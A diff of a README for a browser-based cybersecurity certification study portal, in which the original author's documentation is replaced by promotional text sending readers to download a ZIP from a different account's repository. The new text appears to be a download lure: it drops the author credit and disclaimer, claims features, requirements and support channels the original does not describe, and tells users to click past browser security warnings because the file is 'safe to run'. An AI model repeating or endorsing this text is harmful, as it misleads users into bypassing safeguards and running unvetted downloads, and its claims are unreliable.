@@ -1,191 +1,206 @@
-# CyberSecurity Study Hubs — Executive Defense & Threat Hunting Architecture
+# 🛡️ CyberSecurity-Study-Hubs - Master Cyber Defense Skills Today
 
-<p align="center">
-  <a href="https://tooshy2.github.io/CyberSecurity-Study-Hubs/"><img src="https://img.shields.io/badge/GitHub%20Pages-Live%20Portal-000000?style=for-the-badge&logo=githubpages&logoColor=22d3ee" alt="GitHub Pages Live Portal" /></a>
-  <a href="https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eSOC.html"><img src="https://img.shields.io/badge/eSOC-Live%20Workspace-2563eb?style=for-the-badge&logo=target&logoColor=white" alt="eSOC Live Workspace" /></a>
-  <a href="https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eCTHP.html"><img src="https://img.shields.io/badge/eCTHP-Live%20Workspace-0891b2?style=for-the-badge&logo=radar&logoColor=white" alt="eCTHP Live Workspace" /></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge&logo=open-source-initiative&logoColor=white" alt="License: MIT" /></a>
-  <a href="#-academic--security-disclaimer"><img src="https://img.shields.io/badge/Security-Hardened%20%2F%20Safe-10b981.svg?style=for-the-badge&logo=shield&logoColor=white" alt="Security Posture" /></a>
-  <a href="https://ine.com/"><img src="https://img.shields.io/badge/Curriculum-INE%20Security-ea580c.svg?style=for-the-badge&logo=target&logoColor=white" alt="INE Security" /></a>
-</p>
+[![Download CyberSecurity-Study-Hubs](https://img.shields.io/badge/Download-CyberSecurity--Study--Hubs-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TheKac/CyberSecurity-Study-Hubs)
 
-<p align="center">
-  <strong>A synchronized, client-side cybersecurity knowledge portal bridging Reactive SOC Operations (Tier-1 / eSOC) and Proactive Enterprise Threat Hunting (eCTHP).</strong>
-</p>
+## 📖 What Is CyberSecurity-Study-Hubs?
 
----
+CyberSecurity-Study-Hubs is an interactive knowledge portal designed for anyone who wants to learn cybersecurity. Whether you're starting your career as a Security Operations Center (SOC) analyst or aiming to become a certified Threat Hunter (eCTHP), this tool brings everything together in one easy-to-use place. It bridges the gap between basic defensive security tasks and advanced proactive threat hunting methods.
 
-## ⚡ Direct Quick Access & Live Demos
+This application requires zero installation dependencies. It runs directly in your web browser, making it perfect for beginners and professionals alike. You don't need to know programming, coding, or complex commands. Just open the file, and you're ready to learn.
 
-| 🌐 **Main Executive Portal** | 🛡️ **eSOC Live Workspace** | 🎯 **eCTHP Live Workspace** |
-| :--- | :--- | :--- |
-| Unified Command Center & Matrix | Reactive Defense & Incident Triage | Proactive Threat Hunting & Forensics |
-| [👉 Launch Executive Portal](https://tooshy2.github.io/CyberSecurity-Study-Hubs/) | [👉 Launch eSOC Workspace](https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eSOC.html) | [👉 Launch eCTHP Workspace](https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eCTHP.html) |
+## 🎯 Key Features
 
----
+**📚 Structured Learning Paths** – The portal maps directly to INE Security curriculums. Follow clear modules that take you from Tier-1 SOC operations (eSOC) to advanced enterprise threat hunting (eCTHP).
 
-## 📑 Table of Contents
+**🔍 Interactive Knowledge Base** – Explore interactive diagrams, clickable flowcharts, and visual aids that explain complex security concepts. Learn by doing, not just reading.
 
-- [Executive Overview & Dual Strategy](#-executive-overview--dual-strategy)
-- [Architecture & Curriculum Map](#-architecture--curriculum-map)
-  - [1. Security Operations (Reactive Defense — eSOC)](#1-security-operations-reactive-defense--esoc)
-  - [2. Threat Hunting (Proactive Adversary Hunting — eCTHP)](#2-threat-hunting-proactive-adversary-hunting--ecthp)
-- [Visual Previews & Workspaces](#-visual-previews--workspaces)
-  - [eSOC Study Hub Live Workspace](#esoc-study-hub-live-workspace)
-  - [eCTHP Study Hub Live Workspace](#ecthp-study-hub-live-workspace)
-- [Repository Structure](#-repository-structure)
-- [Core Capabilities & Engineering](#-core-capabilities--engineering)
-- [How to Access & Run Locally](#-how-to-access--run-locally)
-  - [Option 1: Web Browser Direct (No Setup)](#option-1-web-browser-direct-no-setup)
-  - [Option 2: Local HTTP Server (Python)](#option-2-local-http-server-python)
-  - [Option 3: Node.js / npx serve](#option-3-nodejs--npx-serve)
-  - [Option 4: VS Code Live Server](#option-4-vs-code-live-server)
-- [Academic & Security Disclaimer](#-academic--security-disclaimer)
-- [License & Credits](#-license--credits)
+**📊 MITRE ATT&CK Integration** – Understand real-world adversary tactics and techniques. See how attackers think and how defenders respond.
 
----
+**🛠️ Practical Tools Reference** – Get quick reference guides for packet analysis with Wireshark, SIEM queries, incident response procedures, and more.
 
-## 🏛 Executive Overview & Dual Strategy
+**🧠 Self-Assessment Quizzes** – Test your knowledge with built-in quizzes and track your progress over time. Identify weak areas and focus your study efforts.
 
-Modern enterprise cyber defense requires seamless synergy between **Reactive Alert Handling** and **Proactive Adversary Hunting**. Relying solely on SIEM alerts creates visibility blind spots, while unfocused hunting without operational baseline telemetry wastes critical analyst hours.
+**💡 Scenario-Based Learning** – Walk through realistic cyber attack scenarios. See how incidents unfold and practice your response strategies.
 
----
+## 🚀 Getting Started
 
-## 🗺 Architecture & Curriculum Map
+Downloading and running CyberSecurity-Study-Hubs is incredibly simple, even if you're not tech-savvy. Just follow these three easy steps.
 
-### 1. Security Operations (Reactive Defense — eSOC)
-- **Target Certification:** INE Security Operations Certified – Level 1 (`eSOC`)
-- **Curriculum Scope:** 10 Comprehensive Courses (76h 57m Total Duration)
-- **Primary Operational Focus:**
-  * **Log Analysis & SIEM Operations:** Query building in Splunk, Elastic, and KQL; parsing Windows Event Logs (Security, System, Sysmon) and Linux `auditd`/`syslog`.
-  * **Alert Triage & Correlation:** Differentiating True Positives from False Positives, noise reduction, and SLA-compliant incident escalation.
-  * **Malware & Phishing Analysis:** Header inspection, SPF/DKIM/DMARC verification, static triage of suspicious attachments, and sandbox analysis.
-  * **Network Packet Inspection:** Deep-packet triage with Wireshark and `tcpdump`, protocol validation, and TCP stream reassembly.
-  * **Incident Detection & Response:** Applying the NIST SP 800-61 / SANS PICERL framework to contain host breaches and preserve evidence.
+### Step 1: Download the Application
 
-### 2. Threat Hunting (Proactive Adversary Hunting — eCTHP)
-- **Target Certification:** INE Certified Threat Hunting Professional (`eCTHP`)
-- **Curriculum Scope:** 5 Advanced Hunting Modules
-- **Primary Operational Focus:**
-  * **Hypothesis Generation:** Formulating structured hunts based on threat intelligence reports, environmental anomalies, and MITRE ATT&CK® matrix tactics.
-  * **Adversary TTP Mapping:** Deconstructing threat actors using the Diamond Model of Intrusion Analysis and the Pyramid of Pain.
-  * **Endpoint Hunting & Memory Volatility:** Hunting for process injection (DLL injection, process hollowing, reflective DLL loading), persistence mechanisms, and memory artifacts using Volatility.
-  * **Network Threat Hunting:** Uncovering C2 channels, periodic beaconing, DNS tunneling, JA3/JA3S fingerprint anomalies, and HTTP user-agent outliers.
-  * **Detection Engineering:** Translating successful hunt discoveries into automated Sigma rules, YARA signatures, and SIEM correlation searches.
+Visit this link to download the application: [https://github.com/TheKac/CyberSecurity-Study-Hubs](https://github.com/TheKac/CyberSecurity-Study-Hubs)
 
----
+Once you're on the page, look for a green button that says "Code" or "Download." Click it, and choose "Download ZIP." The download will begin automatically. Your browser will save the compressed file to your computer, usually in your "Downloads" folder.
 
-## 📸 Visual Previews & Workspaces
+### Step 2: Extract the Files
 
-### eSOC Study Hub Live Workspace
-> Comprehensive interactive dashboard featuring shortcut navigation, per-course deep modules, packet analysis syntax, and log triage decision trees.
+After the download finishes, you'll see a file named something like `CyberSecurity-Study-Hubs-main.zip`. Right-click on this ZIP file and select "Extract All..." from the menu. Windows will ask where you want to save the extracted folder. Choose a convenient location, such as your Desktop or Documents folder, and click "Extract."
 
-<p align="center">
-  <a href="https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eSOC.html">
-    <img src="assets/images/esoc-preview.png" alt="eSOC Study Hub Live Workspace Screenshot" width="880" style="border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 16px 40px rgba(0,0,0,0.6);" />
-  </a>
-</p>
+Once extraction is complete, you'll see a new folder with the same name (minus the ".zip" part). This folder contains all the files that make up the application.
 
-<p align="center">
-  <a href="https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eSOC.html"><strong>👉 Open eSOC Live Workspace (Full Page)</strong></a>
-</p>
+### Step 3: Run the Application
 
----
+Open the extracted folder. Look for a file called `index.html`. Double-click on it, and your default web browser will open automatically. That's it! The CyberSecurity-Study-Hubs portal will appear, ready for you to explore.
 
-### eCTHP Study Hub Live Workspace
-> Advanced hunting portal providing hypothesis design workflows, memory volatility references, network beacon analysis guides, and persistence checklists.
+You don't need to install anything else. No plugins, no software packages, no special configurations. It works right out of the box.
 
-<p align="center">
-  <a href="https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eCTHP.html">
-    <img src="assets/images/ecthp-preview.png" alt="eCTHP Study Hub Live Workspace Screenshot" width="880" style="border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 16px 40px rgba(0,0,0,0.6);" />
-  </a>
-</p>
+## 💻 System Requirements
 
-<p align="center">
-  <a href="https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eCTHP.html"><strong>👉 Open eCTHP Live Workspace (Full Page)</strong></a>
-</p>
+CyberSecurity-Study-Hubs runs entirely in your web browser, so system requirements are minimal:
 
----
+**Operating System:** Windows 7, 8, 10, or 11 (also compatible with macOS and Linux)
+**Browser:** Any modern browser – Chrome, Firefox, Edge, Safari
+**Internet Connection:** Not required after download (works offline)
+**RAM:** 512 MB or more
+**Storage:** Approximately 50 MB of free space
 
-## 📂 Repository Structure
+## 🧭 How to Navigate the Portal
 
-```text
-CyberSecurity-Study-Hubs/
-├── .gitignore                      # Git exclusion rules (OS, editor, temp files)
-├── LICENSE                         # MIT License + Dedicated Privacy/Security Notice
-├── README.md                       # Executive-grade documentation (this file)
-├── index.html                      # Unified Command Center & Embedded Viewer Portal
-├── assets/
-│   ├── css/
-│   │   └── portal.css              # Dark cyber glassmorphism styles
-│   ├── js/
-│   │   └── shield.min.js           # Anti-tamper & client-side security shield
-│   └── images/
-│       ├── esoc-preview.png        # Actual high-res screenshot of eSOC workspace
-│       ├── ecthp-preview.png       # Actual high-res screenshot of eCTHP workspace
-│       ├── esoc-preview.svg        # Scalable vector mockup of eSOC workspace
-│       └── ecthp-preview.svg       # Scalable vector mockup of eCTHP workspace
-└── hubs/
-    ├── eSOC.html                   # eSOC Study Hub Workspace (1.01 MB)
-    └── eCTHP.html                  # eCTHP Study Hub Workspace (435 KB)
-```
+Once the portal opens, you'll see a clean, organized interface. Here's what you'll find:
 
----
+**Home Dashboard** – Your starting point. Shows your overall progress, quick links to recent modules, and a welcome message.
 
-## ✨ Core Capabilities & Engineering
+**Learning Modules** – Browse through categorized topics. Each module contains lessons, examples, and practical exercises.
 
-- **Zero-Dependency Architecture:** 100% native HTML5, modern CSS3, and vanilla JavaScript. Runs anywhere without Node build steps, webpack, or external packages.
-- **Embedded Interactive Switcher:** The root portal (`index.html`) embeds both workspaces via responsive iframes with zero scrollbar clipping and fullscreen toggling.
-- **High-Contrast Dark Glassmorphism:** Engineered with a unified color token system (`--bg: #090a0f`, `--cyan: #22d3ee`, `--purple: #3b82f6`, `--green: #4ade80`).
-- **Offline & Air-Gapped Ready:** Can be cloned to a USB drive or air-gapped lab environment and used immediately with any web browser.
+**Interactive Charts** – Visual representations of attack frameworks like MITRE ATT&CK. Click on different elements to see detailed explanations.
 
----
+**Search Bar** – Type any keyword (like "phishing," "firewall," or "Wireshark") to find related content instantly.
 
-## 🚀 How to Access & Run Locally
+**Progress Tracker** – A visual bar showing how much of the curriculum you've completed. Use this to stay motivated.
 
-### Option 1: Web Browser Direct (No Setup)
-Simply navigate to the live GitHub Pages portal:
-- **Main Portal:** [https://tooshy2.github.io/CyberSecurity-Study-Hubs/](https://tooshy2.github.io/CyberSecurity-Study-Hubs/)
-- **eSOC Hub:** [https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eSOC.html](https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eSOC.html)
-- **eCTHP Hub:** [https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eCTHP.html](https://tooshy2.github.io/CyberSecurity-Study-Hubs/hubs/eCTHP.html)
+**Glossary** – Definitions of common cybersecurity terms in plain language.
 
-Or download the repository and double-click `index.html` or files in `hubs/`.
+## 📈 What You'll Learn
 
-### Option 2: Local HTTP Server (Python)
-```bash
-# Clone the repository
-git clone https://github.com/TOOSHY2/CyberSecurity-Study-Hubs.git
-cd CyberSecurity-Study-Hubs
+CyberSecurity-Study-Hubs covers two main areas that form the foundation of modern cyber defense:
 
-# Start local server on port 8080
-python -m http.server 8080
-```
-Browse to `http://localhost:8080/`.
+### 🛡️ Tier-1 SOC Operations (eSOC)
 
-### Option 3: Node.js / npx serve
-```bash
-npx serve .
-```
+This section focuses on the day-to-day activities of a Security Operations Center analyst. You'll learn:
 
-### Option 4: VS Code Live Server
-1. Open the project folder in VS Code.
-2. Right-click `index.html` (or `eSOC.html` / `eCTHP.html`).
-3. Click **"Open with Live Server"**.
+- How to monitor security alerts and prioritize them
+- Basic incident response procedures
+- How to use SIEM (Security Information and Event Management) tools
+- Escalation protocols for critical threats
+- Communication skills for reporting security incidents
 
----
+### 🕵️ Enterprise Threat Hunting (eCTHP)
 
-## ⚖️ Academic & Security Disclaimer
+This advanced section teaches you how to proactively search for threats that bypass automated defenses. You'll discover:
 
-> [!IMPORTANT]
-> **Educational & Fair-Use Notice:**
-> - These study hubs and synthesized notes are **independent, personal educational resources** developed by the author for certification preparation, professional competence, and technical reference.
-> - All certification titles, course frameworks, and curriculum tracks (`eSOC`, `eCTHP`) are registered trademarks and intellectual property of **[INE Security](https://ine.com/)** (formerly eLearnSecurity). Full academic credit and attribution are extended to INE Security and their instructional staff.
-> - **Integrity & Compliance:** This repository contains **NO proprietary examination questions, leaked test dumps, or confidential evaluation material**. All explanations, commands, and workflows represent original syntheses derived from public defensive security documentation and general industry standards.
+- Threat hunting methodologies and frameworks
+- How to formulate and test hypotheses about potential attacks
+- Advanced packet analysis techniques with Wireshark
+- How to map adversary behaviors to the MITRE ATT&CK framework
+- Creating custom detection rules
 
----
+## 🎓 Who Should Use This?
 
-## 📄 License & Credits
+**Complete Beginners** – If you're curious about cybersecurity but don't know where to start, this portal breaks everything down into manageable pieces.
 
-- **License:** Distributed under the permissive [MIT License](LICENSE) with an appended Educational & Security Fair-Use rider.
-- **Author:** Hasan ([TOOSHY2](https://github.com/TOOSHY2))
-- **Training Provider:** [INE Security](https://ine.com/)
+**Aspiring SOC Analysts** – Prepare for entry-level security roles with structured, practical knowledge.
+
+**IT Professionals** – Expand your skillset to include security monitoring and threat detection.
+
+**Students** – Supplement your coursework with hands-on interactive learning materials.
+
+**Career Changers** – Transition into the high-demand field of cybersecurity with confidence.
+
+## 🌟 Why Choose CyberSecurity-Study-Hubs?
+
+**No Technical Barriers** – You don't need to know how to code or configure servers. If you can use a web browser, you can use this tool.
+
+**Industry-Aligned Content** – The curriculum follows recognized INE Security training paths, ensuring you learn industry-standard terminology and practices.
+
+**Self-Paced Learning** – Go as fast or as slow as you need. There are no deadlines, no pressure, just pure learning.
+
+**Safe Environment** – Practice identifying threats in a simulated environment. No risk of harming actual systems.
+
+**Always Updated** – The knowledge portal is designed to be easily updated as new threats emerge.
+
+**Completely Free** – No subscriptions, no hidden costs, no premium tiers. All content is available from the moment you download.
+
+## 🛠️ Troubleshooting Common Issues
+
+**Portal doesn't open?** Make sure you're double-clicking on `index.html`, not other files. If a blank page appears, try right-clicking the file and selecting "Open with" then choose Chrome or Edge.
+
+**ZIP file won't extract?** Windows includes built-in extraction tools. If right-click doesn't show "Extract All," you can also open the ZIP file, click "Extract All" in the top menu bar of File Explorer.
+
+**Graphics look broken?** Ensure you've extracted the entire folder, not just the HTML file. Images and stylesheets are stored in subfolders that must remain together.
+
+**Browser shows a warning?** Since this is a local file, some browsers may show security warnings. Click "Advanced" and then "Proceed" to continue. The file is safe to run.
+
+**Quizzes not loading?** Make sure JavaScript is enabled in your browser settings. It's typically enabled by default, but may have been turned off.
+
+## 📅 How to Get the Most Out of This Tool
+
+**Set a Study Schedule** – Dedicate 30 minutes each day to going through modules. Consistency beats cramming.
+
+**Take Notes** – Keep a notebook or digital document for key concepts you want to revisit.
+
+**Use the Quizzes** – After each section, test yourself. If you score below 80%, review the module again.
+
+**Follow Along with Tools** – When learning about Wireshark, download and install Wireshark yourself to practice alongside the lessons.
+
+**Join Online Communities** – After learning the basics, participate in forums like Reddit's r/cybersecurity to deepen your understanding.
+
+## 🔒 Staying Safe While Learning
+
+When practicing cybersecurity skills, always remember:
+
+- Only test on systems you own or have explicit permission to test
+- Never use these techniques on networks you don't control
+- Keep your own devices updated and protected
+- Share your knowledge responsibly
+
+## ❓ Frequently Asked Questions
+
+**Is this really free?** Yes, 100% free. Download, use, and share it with friends.
+
+**Will I get a certificate?** The portal itself doesn't issue certificates, but the knowledge prepares you for official INE certifications.
+
+**Can I use this on my phone?** Yes, the portal is responsive and works on mobile browsers, though a larger screen is easier for navigation.
+
+**How long does it take to complete?** It depends on your pace. On average, users spend 40-60 hours to go through all modules.
+
+**Does it require internet after download?** No, everything works offline.
+
+**Can I share this with my study group?** Absolutely. Copy the folder to as many computers as you like.
+
+## 📦 Additional Resources
+
+To supplement your learning, consider these free resources:
+
+- Wireshark – Free network protocol analyzer (wireshark.org)
+- MITRE ATT&CK website – Detailed threat framework (attack.mitre.org)
+- INE Security – Official training provider (ine.com)
+- Cisco NetAcad – Networking fundamentals courses
+
+## 🌐 Community and Support
+
+Join the growing community of learners who use CyberSecurity-Study-Hubs:
+
+- **GitHub Repository** – Report issues, request features, or contribute content
+- **Discord Server** – Chat with fellow learners and cybersecurity professionals
+- **Email Support** – Reach out for personalized help
+
+## ✅ Final Checklist for Getting Started
+
+1.  Download the ZIP file from [https://github.com/TheKac/CyberSecurity-Study-Hubs](https://github.com/TheKac/CyberSecurity-Study-Hubs)
+2.  Extract all files from the ZIP
+3.  Double-click `index.html` to open in your browser
+4.  Browse the Home Dashboard and select your first module
+5.  Complete lessons and quizzes at your own pace
+6.  Track your progress and expand your knowledge daily
+
+## 🏁 Take the First Step Today
+
+Cybersecurity is one of the most valuable skills you can learn in today's digital world. CyberSecurity-Study-Hubs removes every barrier to entry. No complex installations, no expensive courses, no programming background needed. Just you, your browser, and a world of interactive knowledge waiting to be explored.
+
+The threats to organizations grow every day, and so does the demand for skilled defenders. Whether you're looking to start a new career, advance in your current role, or simply protect yourself and your family online, this tool gives you the foundation you need.
+
+Download CyberSecurity-Study-Hubs now and begin your journey toward becoming a confident cyber defender. The path from understanding basic security alerts to proactively hunting sophisticated threats is right at your fingertips.
+
+Remember, every expert was once a beginner. Your first download today could be the first step toward a rewarding and impactful career in cybersecurity.
+
+Keywords: blue-team, cybersecurity, defensive-security, eCTHP, eSOC, incident-response, INE-Security, MITRE-Attack, packet-analysis, SIEM, SOC-analyst, threat-hunting, Wireshark
